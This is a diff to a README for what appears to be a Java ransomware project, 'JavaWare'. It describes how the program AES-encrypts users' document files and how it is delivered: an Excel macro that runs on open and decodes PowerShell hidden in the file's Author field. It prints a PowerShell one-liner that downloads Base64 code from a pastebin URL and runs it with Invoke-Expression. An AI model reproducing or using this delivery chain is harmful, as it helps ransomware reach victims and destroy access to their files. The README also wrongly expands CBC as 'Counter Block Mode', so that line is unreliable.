@@ -16,10 +16,10 @@ AES 128 bit Encryption in CBC Mode (Counter Block Mode ) PKCS5 Padding <br/>
 AES is a symmetric encryption algorithm which works on blocks of a fixed size (16 bytes for AES128). *Padding* (PKCS5) is used if the block is less than 16 bytes long. We split the stream into 16 byte blocks, which is encrypted using AES and the result is XORed with the next block in the stream before it is encrypted. For the first block, it XORs it with an *initialization vector*, a random 16 byte value. 
 
 ### What does it encrypt?
-*FileTypes.java* defines what type of files to encrypt, it includes common document types and so will avoid program files to ensure your system is still functional. Similarly, *AvoidedDir.java* includes directories to avoid in traversal, such as *Windows* and *Program Files*. The PowerShell script is: 
+*FileTypes.java* defines what type of files to encrypt, it includes common document types and so will avoid program files to ensure your system is still functional. Similarly, *AvoidedDir.java* includes directories to avoid in traversal, such as *Windows* and *Program Files*. 
 
 ### How does it launch?
-The Microsoft Excel file, *August Report.xlsm* contains a Macro which is run on Workbook Open. Encoded Base64 PowerShell code is hidden within this file under the 'Author' field. So the macro calls a function which gets the author, decodes it, and then runs the shell. 
+The Microsoft Excel file, *August Report.xlsm* contains a Macro which is run on Workbook Open. Encoded Base64 PowerShell code is hidden within this file under the 'Author' field[1]. So the macro calls a function which gets the author, decodes it, and then runs the shell. The PowerShell script is: 
 ```powershell
 Powershell Invoke-Expression -Command  $([string]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-WebRequest -Uri https://pastebin.com/raw/1JDNWfqP).content)
 ```
@@ -30,5 +30,7 @@ Powershell Invoke-Expression -Command  $([string]([System.Text.Encoding]::UTF8.G
 java --module-path "C:\Users\Admin\Desktop\JavaWare\javafx-sdk-11.0.2\lib\" --add-modules=javafx.controls -jar Users\Admin\Desktop\JavaWare\JavaWare.jar
 
 
-references: 
-https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf
+### References:
+[\[1\]: The Increased Use of PowerShell in Attacks - Symantec](https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf) <br/>
+Gave me the idea to put my powershell code in the auhtor field, and other useful powershell commands.
+
